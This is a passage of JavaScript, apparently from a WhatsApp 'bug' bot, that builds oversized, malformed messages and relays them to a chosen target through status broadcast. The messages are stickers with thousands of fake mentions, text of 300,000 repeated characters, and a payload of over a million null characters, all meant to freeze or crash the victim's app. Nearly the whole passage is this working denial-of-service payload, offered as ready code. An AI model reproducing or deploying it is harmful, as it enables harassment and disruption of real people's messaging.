  const zepSessionId = "5e03e0";
  const zepFileHash = "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=";
  const zepEncHash = "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=";
  const zepKey = "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=";
  const useParse = false;
  const mimeType = "image/webp";

  const crt = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${zepMediaPath}=${zepyBuffer}=${zepUserId}&_nc_sid=${zepSessionId}&mms3=true`,
          fileSha256: zepFileHash,
          fileEncSha256: zepEncHash,
          mediaKey: zepKey,
          mimetype: mimeType,
          directPath: `/v/${zepMediaPath}=${zepyBuffer}=${zepUserId}&_nc_sid=${zepSessionId}`,
          fileLength: {
            low: Math.floor(Math.random() * 2048),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1800000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 2000 }, () => {
                return "1" + Math.floor(Math.random() * 900000) + "@s.whatsapp.net";
              }),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: useParse,
          },
          isAvatar: useParse,
          isAiSticker: useParse,
          isLottie: useParse,
        },
      },
    },
  };

  const CJefrin = generateWAMessageFromContent(target, crt, {});

  await sock.relayMessage("status@broadcast", CJefrin.message, {
    messageId: CJefrin.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function zepdelayv4(sock, target, mention) {
  const pilusGaruda = "ꦽ".repeat(300000);
  const spamMessage = {
    extendedTextMessage: {
      text: pilusGaruda,
      contextInfo: {
        participant: target,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
          )
        ]
      }
    }
  };

  const chikaSygZep = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "\n\nwho's X-Moon?\n\n",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "galaxy_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: `#${Math.floor(Math.random() * 0xffffff).toString(16).padStart(6, "0")}`
  });

  const zepSygChika = generateWAMessageFromContent(target, spamMessage, {});

  await sock.relayMessage("status@broadcast", zepSygChika.message, {
    messageId: zepSygChika.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  await sleep(500);

  if (mention) {
    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: zepSygChika.key.id,
            type: 25
          }
        }
      }
    }, {});
  }

  await sock.relayMessage("status@broadcast", chikaSygZep.message, {
    messageId: chikaSygZep.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  await sleep(500);

  if (mention) {
    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: chikaSygZep.key.id,
            type: 25
          }
        }
      }
    }, {});
  }
}
//---------end function----------\\